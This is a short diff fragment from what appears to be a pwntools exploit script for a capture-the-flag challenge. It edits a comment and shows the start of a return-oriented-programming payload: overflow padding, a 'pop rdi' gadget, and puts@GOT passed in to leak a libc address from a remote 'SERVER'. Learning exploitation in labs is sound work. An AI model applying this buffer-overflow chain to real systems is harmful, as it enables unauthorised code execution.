@@ -8,7 +8,7 @@ p = remote("SERVER", PORT)
 context.binary = elf
 
 
-# leaking puts@libc
+# leaking puts@libc address
 payload = b'A' * 72 # padding
 payload += p64(0x4007b3) # pop rdi ; ret
 payload += p64(0x601018) # puts@GOT into the function argument
